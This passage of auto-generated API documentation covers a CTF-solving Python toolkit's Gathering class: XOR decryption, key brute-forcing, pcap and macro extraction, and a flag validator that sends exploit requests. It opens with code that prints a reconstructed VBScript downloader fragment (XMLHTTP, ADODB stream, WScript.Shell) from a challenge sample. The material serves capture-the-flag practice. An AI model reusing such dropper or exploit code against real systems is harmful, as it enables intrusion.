    output_lines.append(&#34;objADOStream.Close&#34;)
    output_lines.append(&#34;Set objADOStream = Nothing&#34;)
    output_lines.append(&#34;End if&#34;)
    output_lines.append(&#34;Set objXMLHTTP = Nothing&#34;)
    output_lines.append(&#39;Set objShell = CreateObject(&#34;WScript.Shell&#34;)&#39;)

    # Printing the output lines (would typically write to a file)
    for line in output_lines:
        print(line)

    # Values of constructed variables for validation
    print(&#34;Constructed Values:&#34;)
    print(&#34;HPkXUcxLcAoMHOlj:&#34;, part_1)
    print(&#34;cxPZSGdIQDAdRVpziKf:&#34;, part_2)
    print(&#34;fqtSMHFlkYeyLfs:&#34;, part_3)
    print(&#34;ehPsgfAcWaYrJm:&#34;, part_4)
    print(&#34;FVpHoEqBKnhPO:&#34;, part_5)
    print(&#34;strRT:&#34;, part_6)
    print(&#34;strTecation:&#34;, part_7)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.try_catch"><code class="name flex">
<span>def <span class="ident">try_catch</span></span>(<span>self, callback)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def try_catch(self, callback):
    try:
        callback()
    except Exception as error:
        print(error)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.try_key"><code class="name flex">
<span>def <span class="ident">try_key</span></span>(<span>self, candidate:str)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def try_key(self, candidate: str):
    key = candidate.encode()
    if len(key) &lt; 5:
        return None

    # Transform key_step1 using input
    transformed_key = self.mutate_key(self.key_step1, key)
    # First decryption stage
    intermediate = self.xor_decrypt(self.encrypted_intermediate, transformed_key)
    # Final decryption
    flag = self.xor_decrypt(self.encrypted_flag, intermediate)
    return flag</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.trying_to_exploit_ods"><code class="name flex">
<span>def <span class="ident">trying_to_exploit_ods</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def trying_to_exploit_ods(self):
    # Extract macros from the ODS file
    # macros = self.extract_macros_from_ods_initial()
    # Print the extracted macros

    files = self.list_all_files(self.challenge_file)
    # macros = self.extract_macros_with_odfpy(self.challenge_file)
    macros = self.extract_macros_with_odfpy(self.challenge_file, files)
    print(macros)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.unified_extract_packets"><code class="name flex">
<span>def <span class="ident">unified_extract_packets</span></span>(<span>self, pcap_file, pcap_function:str, raw:bool=False)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def unified_extract_packets(self, pcap_file, pcap_function: str, raw: bool = False):
    &#34;&#34;&#34;
    Description:
        Extracts the packets from the pcap file and saves them as a numbered dictionary.
        Can use either scapy or pyshark to extract the packets.

    Args:
        pcap_file (str): Path to the pcap file.
        pcap_function (str): Function to use to extract the packets.[scapy, pyshark]

    Returns:
        dict: Dictionary of packets
    &#34;&#34;&#34;

    packets = None
    # Dictionary to hold packets
    packets_dict = {}

    if pcap_function == &#34;scapy&#34;:
        packets = rdpcap(pcap_file.as_posix())
    elif pcap_function == &#34;pyshark&#34;:
        packets = pyshark.FileCapture(pcap_file.as_posix())

    if raw:
        return packets

    for i, packet in enumerate(packets):
        packets_dict[i + 1] = packet

    return packets_dict</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>Extracts the packets from the pcap file and saves them as a numbered dictionary.
Can use either scapy or pyshark to extract the packets.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>pcap_file</code></strong> :&ensp;<code>str</code></dt>
<dd>Path to the pcap file.</dd>
<dt><strong><code>pcap_function</code></strong> :&ensp;<code>str</code></dt>
<dd>Function to use to extract the packets.[scapy, pyshark]</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>dict</code></dt>
<dd>Dictionary of packets</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.validate_flag"><code class="name flex">
<span>def <span class="ident">validate_flag</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def validate_flag(self):
    for i, letter in enumerate(self.flag):
        exploit = self.exploit_development(i, letter)
        print(f&#34;[+] Trying: {letter}&#34;)
        response = self.sending_request(exploit=exploit)
        if response and &#34;result&#34; in response:
            try:
                result = int(response[&#34;result&#34;])
                if result == 0:
                    print(f&#34;[-] Flag is invalid at position {i}: {letter}&#34;)
                    return False
            except ValueError:
                print(&#34;[-] Failed to parse response.&#34;)
                return False
        else:
            print(&#34;[-] No valid response received.&#34;)
            return False
    print(&#34;[+] Flag is valid!&#34;)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.verify_js_reconstructed"><code class="name flex">
<span>def <span class="ident">verify_js_reconstructed</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def verify_js_reconstructed(self):
    self.challenge_file = self.Path(self.folder_data, &#34;chall_edited.pptx&#34;)
    self.try_catch(self.run)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.xor_bytes"><code class="name flex">
<span>def <span class="ident">xor_bytes</span></span>(<span>self, a, b)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def xor_bytes(self, a, b):
    return bytes(x ^ y for x, y in zip(a, b))</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.xor_decrypt"><code class="name flex">
<span>def <span class="ident">xor_decrypt</span></span>(<span>self, key_bytes:bytes, input_bytes:bytes) >bytes</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def xor_decrypt(self, key_bytes: bytes, input_bytes: bytes) -&gt; bytes:
    key_len = len(input_bytes)
    result = bytearray(key_len)
    for i in range(key_len):
        result[i] = input_bytes[i % len(input_bytes)] ^ key_bytes[i]
    return result</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.xor_function_dec"><code class="name flex">
<span>def <span class="ident">xor_function_dec</span></span>(<span>self, given_string, length)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def xor_function_dec(self, given_string, length):
    xor_key = 45
    result = bytearray()
    for i in range(length):
        result.append(given_string[i] ^ xor_key)
        xor_key = (xor_key ^ 99) ^ (i % 254)
    return bytes(result)</code></pre>
</details>
<div class="desc"></div>
</dd>
</dl>
<h3>Inherited members</h3>
<ul class="hlist">
<li><code><b><a title="ctfsolver.src.ctfsolver.CTFSolver" href="../src/ctfsolver.html#ctfsolver.src.ctfsolver.CTFSolver">CTFSolver</a></b></code>:
<ul class="hlist">
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.challenge_folder_structure" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.challenge_folder_structure">challenge_folder_structure</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.check_empty_folder" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.check_empty_folder">check_empty_folder</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.check_name_similarity_in_files" href="../managers/manager_files_re.html#ctfsolver.managers.manager_files_re.ManagerFileRegex.check_name_similarity_in_files">check_name_similarity_in_files</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.clean_folders" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.clean_folders">clean_folders</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.connect" href="../managers/manager_connections.html#ctfsolver.managers.manager_connections.ManagerConnections.connect">connect</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.copy_folder" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.copy_folder">copy_folder</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.create_ctf_structure" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.create_ctf_structure">create_ctf_structure</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.create_parent_folder" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.create_parent_folder">create_parent_folder</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.decode_base64" href="../managers/manager_crypto.html#ctfsolver.managers.manager_crypto.ManagerCrypto.decode_base64">decode_base64</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.delete_folder" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.delete_folder">delete_folder</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.download_automove" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.download_automove">download_automove</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.exec_on_files" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.exec_on_files">exec_on_files</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.exec_on_folder" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.exec_on_folder">exec_on_folder</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.exec_on_folder_files" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.exec_on_folder_files">exec_on_folder_files</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.extract_strings" href="../managers/manager_files_re.html#ctfsolver.managers.manager_files_re.ManagerFileRegex.extract_strings">extract_strings</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.find_function_from_file" href="../managers/manager_functions.html#ctfsolver.managers.manager_functions.ManagerFunction.find_function_from_file">find_function_from_file</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.folders_file" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.folders_file">folders_file</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.folfil" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.folfil">folfil</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.get_challenge_file" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.get_challenge_file">get_challenge_file</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.get_function_reference" href="../managers/manager_functions.html#ctfsolver.managers.manager_functions.ManagerFunction.get_function_reference">get_function_reference</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.get_functions_from_file" href="../managers/manager_functions.html#ctfsolver.managers.manager_functions.ManagerFunction.get_functions_from_file">get_functions_from_file</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.get_packet_ttl" href="../managers/manager_files_pcap.html#ctfsolver.managers.manager_files_pcap.ManagerFilePcap.get_packet_ttl">get_packet_ttl</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.get_packets_icmp" href="../managers/manager_files_pcap.html#ctfsolver.managers.manager_files_pcap.ManagerFilePcap.get_packets_icmp">get_packets_icmp</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.get_parent" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.get_parent">get_parent</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.get_self_functions" href="../managers/manager_functions.html#ctfsolver.managers.manager_functions.ManagerFunction.get_self_functions">get_self_functions</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.get_solution_file" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.get_solution_file">get_solution_file</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.handle" href="../error/manager_error.html#ctfsolver.error.manager_error.ManagerError.handle">handle</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.init_for_challenge" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.init_for_challenge">init_for_challenge</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.initializing_all_ancestors" href="../src/ctfsolver.html#ctfsolver.src.ctfsolver.CTFSolver.initializing_all_ancestors">initializing_all_ancestors</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.initializing_file_ancestors" href="../managers/manager_file.html#ctfsolver.managers.manager_file.ManagerFile.initializing_file_ancestors">initializing_file_ancestors</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.initiate_connection" href="../managers/manager_connections.html#ctfsolver.managers.manager_connections.ManagerConnections.initiate_connection">initiate_connection</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.main" href="../src/ctfsolver.html#ctfsolver.src.ctfsolver.CTFSolver.main">main</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.normalize_name" href="../managers/manager_files_re.html#ctfsolver.managers.manager_files_re.ManagerFileRegex.normalize_name">normalize_name</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.pcap_open" href="../managers/manager_files_pcap.html#ctfsolver.managers.manager_files_pcap.ManagerFilePcap.pcap_open">pcap_open</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.prepare_space" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.prepare_space">prepare_space</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.re_match_base64_string" href="../managers/manager_crypto.html#ctfsolver.managers.manager_crypto.ManagerCrypto.re_match_base64_string">re_match_base64_string</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.re_match_flag" href="../managers/manager_crypto.html#ctfsolver.managers.manager_crypto.ManagerCrypto.re_match_flag">re_match_flag</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.re_match_partial_flag" href="../managers/manager_crypto.html#ctfsolver.managers.manager_crypto.ManagerCrypto.re_match_partial_flag">re_match_partial_flag</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.recursive_folder_search" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.recursive_folder_search">recursive_folder_search</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.recv_lines" href="../managers/manager_connections.html#ctfsolver.managers.manager_connections.ManagerConnections.recv_lines">recv_lines</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.recv_send" href="../managers/manager_connections.html#ctfsolver.managers.manager_connections.ManagerConnections.recv_send">recv_send</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.recv_until" href="../managers/manager_connections.html#ctfsolver.managers.manager_connections.ManagerConnections.recv_until">recv_until</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.search_files" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.search_files">search_files</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.search_for_base64" href="../managers/manager_file.html#ctfsolver.managers.manager_file.ManagerFile.search_for_base64">search_for_base64</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.search_for_base64_file" href="../managers/manager_file.html#ctfsolver.managers.manager_file.ManagerFile.search_for_base64_file">search_for_base64_file</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.search_for_pattern_in_file" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.search_for_pattern_in_file">search_for_pattern_in_file</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.searching_text_in_packets" href="../managers/manager_files_pcap.html#ctfsolver.managers.manager_files_pcap.ManagerFilePcap.searching_text_in_packets">searching_text_in_packets</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.send" href="../managers/manager_connections.html#ctfsolver.managers.manager_connections.ManagerConnections.send">send</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.send_menu" href="../managers/manager_connections.html#ctfsolver.managers.manager_connections.ManagerConnections.send_menu">send_menu</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.setup_named_folders" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.setup_named_folders">setup_named_folders</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.single_folder_search" href="../managers/manager_folder.html#ctfsolver.managers.manager_folder.ManagerFolder.single_folder_search">single_folder_search</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.string_similarity" href="../managers/manager_files_re.html#ctfsolver.managers.manager_files_re.ManagerFileRegex.string_similarity">string_similarity</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.try_function" href="../error/manager_error.html#ctfsolver.error.manager_error.ManagerError.try_function">try_function</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.try_main" href="../src/ctfsolver.html#ctfsolver.src.ctfsolver.CTFSolver.try_main">try_main</a></code></li>
<li><code><a title="ctfsolver.src.ctfsolver.CTFSolver.xor" href="../managers/manager_crypto.html#ctfsolver.managers.manager_crypto.ManagerCrypto.xor">xor</a></code></li>
</ul>
</li>
</ul>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="ctfsolver.find_usage" href="index.html">ctfsolver.find_usage</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="ctfsolver.find_usage.gathering.Gathering" href="#ctfsolver.find_usage.gathering.Gathering">Gathering</a></code></h4>
<ul class="">
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.another_attempt" href="#ctfsolver.find_usage.gathering.Gathering.another_attempt">another_attempt</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.ascii_converter" href="#ctfsolver.find_usage.gathering.Gathering.ascii_converter">ascii_converter</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.ascii_converter1" href="#ctfsolver.find_usage.gathering.Gathering.ascii_converter1">ascii_converter1</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.ascii_rot" href="#ctfsolver.find_usage.gathering.Gathering.ascii_rot">ascii_rot</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.attempt_for_loop_subkeys" href="#ctfsolver.find_usage.gathering.Gathering.attempt_for_loop_subkeys">attempt_for_loop_subkeys</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.bits_to_ascii" href="#ctfsolver.find_usage.gathering.Gathering.bits_to_ascii">bits_to_ascii</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.breakfiles" href="#ctfsolver.find_usage.gathering.Gathering.breakfiles">breakfiles</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.brute_ascii_rot" href="#ctfsolver.find_usage.gathering.Gathering.brute_ascii_rot">brute_ascii_rot</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.brute_force" href="#ctfsolver.find_usage.gathering.Gathering.brute_force">brute_force</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.brute_transpose_find_flag" href="#ctfsolver.find_usage.gathering.Gathering.brute_transpose_find_flag">brute_transpose_find_flag</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.bruteforce" href="#ctfsolver.find_usage.gathering.Gathering.bruteforce">bruteforce</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.bruteforce_address" href="#ctfsolver.find_usage.gathering.Gathering.bruteforce_address">bruteforce_address</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.bruteforce_all_lyrics" href="#ctfsolver.find_usage.gathering.Gathering.bruteforce_all_lyrics">bruteforce_all_lyrics</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.bruteforce_key" href="#ctfsolver.find_usage.gathering.Gathering.bruteforce_key">bruteforce_key</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.bruteforce_key_multiprocessing" href="#ctfsolver.find_usage.gathering.Gathering.bruteforce_key_multiprocessing">bruteforce_key_multiprocessing</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.bruteforcer" href="#ctfsolver.find_usage.gathering.Gathering.bruteforcer">bruteforcer</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.bruteforcing" href="#ctfsolver.find_usage.gathering.Gathering.bruteforcing">bruteforcing</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.bruteforcing_failed" href="#ctfsolver.find_usage.gathering.Gathering.bruteforcing_failed">bruteforcing_failed</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.build_payload" href="#ctfsolver.find_usage.gathering.Gathering.build_payload">build_payload</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.bytes_to_int_array" href="#ctfsolver.find_usage.gathering.Gathering.bytes_to_int_array">bytes_to_int_array</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.challenge_get_offset_address" href="#ctfsolver.find_usage.gathering.Gathering.challenge_get_offset_address">challenge_get_offset_address</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.check_for_rot" href="#ctfsolver.find_usage.gathering.Gathering.check_for_rot">check_for_rot</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.check_password_time" href="#ctfsolver.find_usage.gathering.Gathering.check_password_time">check_password_time</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.connecting_db" href="#ctfsolver.find_usage.gathering.Gathering.connecting_db">connecting_db</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.context" href="#ctfsolver.find_usage.gathering.Gathering.context">context</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.copy" href="#ctfsolver.find_usage.gathering.Gathering.copy">copy</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.create_token" href="#ctfsolver.find_usage.gathering.Gathering.create_token">create_token</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.creating_control_combos" href="#ctfsolver.find_usage.gathering.Gathering.creating_control_combos">creating_control_combos</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.creating_stream" href="#ctfsolver.find_usage.gathering.Gathering.creating_stream">creating_stream</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.csend" href="#ctfsolver.find_usage.gathering.Gathering.csend">csend</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.current_initiate_connection" href="#ctfsolver.find_usage.gathering.Gathering.current_initiate_connection">current_initiate_connection</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.custom_init" href="#ctfsolver.find_usage.gathering.Gathering.custom_init">custom_init</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.custom_packet_997_attempt" href="#ctfsolver.find_usage.gathering.Gathering.custom_packet_997_attempt">custom_packet_997_attempt</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.custom_re_match_base64_string" href="#ctfsolver.find_usage.gathering.Gathering.custom_re_match_base64_string">custom_re_match_base64_string</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.custom_stream_extract" href="#ctfsolver.find_usage.gathering.Gathering.custom_stream_extract">custom_stream_extract</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.data_processing" href="#ctfsolver.find_usage.gathering.Gathering.data_processing">data_processing</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.de_hexing_flag" href="#ctfsolver.find_usage.gathering.Gathering.de_hexing_flag">de_hexing_flag</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.dec_file_mes" href="#ctfsolver.find_usage.gathering.Gathering.dec_file_mes">dec_file_mes</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.decode_address" href="#ctfsolver.find_usage.gathering.Gathering.decode_address">decode_address</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.decode_hamming74" href="#ctfsolver.find_usage.gathering.Gathering.decode_hamming74">decode_hamming74</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.decode_manchester" href="#ctfsolver.find_usage.gathering.Gathering.decode_manchester">decode_manchester</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.decode_nrz_i" href="#ctfsolver.find_usage.gathering.Gathering.decode_nrz_i">decode_nrz_i</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.decode_nrzi" href="#ctfsolver.find_usage.gathering.Gathering.decode_nrzi">decode_nrzi</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.decode_uart" href="#ctfsolver.find_usage.gathering.Gathering.decode_uart">decode_uart</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.decoding" href="#ctfsolver.find_usage.gathering.Gathering.decoding">decoding</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.decrypt" href="#ctfsolver.find_usage.gathering.Gathering.decrypt">decrypt</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.decrypt_password" href="#ctfsolver.find_usage.gathering.Gathering.decrypt_password">decrypt_password</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.decrypt_payload" href="#ctfsolver.find_usage.gathering.Gathering.decrypt_payload">decrypt_payload</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.decrypt_string" href="#ctfsolver.find_usage.gathering.Gathering.decrypt_string">decrypt_string</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.decrypting_packet" href="#ctfsolver.find_usage.gathering.Gathering.decrypting_packet">decrypting_packet</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.decrypting_stream_4" href="#ctfsolver.find_usage.gathering.Gathering.decrypting_stream_4">decrypting_stream_4</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.decrypting_vigenere" href="#ctfsolver.find_usage.gathering.Gathering.decrypting_vigenere">decrypting_vigenere</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.demarshalling" href="#ctfsolver.find_usage.gathering.Gathering.demarshalling">demarshalling</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.deobfuscation" href="#ctfsolver.find_usage.gathering.Gathering.deobfuscation">deobfuscation</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.derive_key_and_iv" href="#ctfsolver.find_usage.gathering.Gathering.derive_key_and_iv">derive_key_and_iv</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.des_key_generator" href="#ctfsolver.find_usage.gathering.Gathering.des_key_generator">des_key_generator</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.dictionary_analysis" href="#ctfsolver.find_usage.gathering.Gathering.dictionary_analysis">dictionary_analysis</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.differ" href="#ctfsolver.find_usage.gathering.Gathering.differ">differ</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.download_images" href="#ctfsolver.find_usage.gathering.Gathering.download_images">download_images</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.downloading" href="#ctfsolver.find_usage.gathering.Gathering.downloading">downloading</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.dynamic_xor_decrypt" href="#ctfsolver.find_usage.gathering.Gathering.dynamic_xor_decrypt">dynamic_xor_decrypt</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.dynamic_xor_encrypt" href="#ctfsolver.find_usage.gathering.Gathering.dynamic_xor_encrypt">dynamic_xor_encrypt</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.emilia_main" href="#ctfsolver.find_usage.gathering.Gathering.emilia_main">emilia_main</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.encode_nrzi" href="#ctfsolver.find_usage.gathering.Gathering.encode_nrzi">encode_nrzi</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.encrypt" href="#ctfsolver.find_usage.gathering.Gathering.encrypt">encrypt</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.evtx_open" href="#ctfsolver.find_usage.gathering.Gathering.evtx_open">evtx_open</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.exec_fmt" href="#ctfsolver.find_usage.gathering.Gathering.exec_fmt">exec_fmt</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.exec_func" href="#ctfsolver.find_usage.gathering.Gathering.exec_func">exec_func</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.exploit" href="#ctfsolver.find_usage.gathering.Gathering.exploit">exploit</a></code></li>
<li><code><a title="ctfsolver.find_usage.gathering.Gathering.exploit_development" href="#ctfsolver.find_usage.gathering.Gathering.exploit_development">exploit_development</a></code></li>
